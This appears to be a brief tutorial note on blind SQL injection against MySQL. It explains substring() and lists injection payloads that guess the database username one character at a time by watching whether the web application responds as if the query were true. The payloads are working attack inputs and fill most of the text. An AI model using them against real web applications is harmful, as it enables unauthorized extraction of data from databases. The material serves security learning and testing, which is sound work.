substring() → returns a substring of the given argument. It takes three parameters:
▪ input string
▪ position of the substring
▪ substring length.
mysql> select substring(user(), 1, 1);


So if we want to exploit an input of a WebApp:
1. Test first letter
1) ' or substr(user(), 1, 1)= 'a
2) ' or substr(user(), 1, 1)= 'b
3) ' or substr(user(), 1, 1)= 'c
4) ... until we not find a sign from the webapp that the query is True
2. Test second letter
1) ' or substr(user(), 2, 1)= 'a
2) ' or substr(user(), 2, 1)= 'b
3) ' or substr(user(), 2, 1)= 'c
4) ... until we not find a sign from the webapp that the query is True

3. ... We continue down this path until we know the entire username.
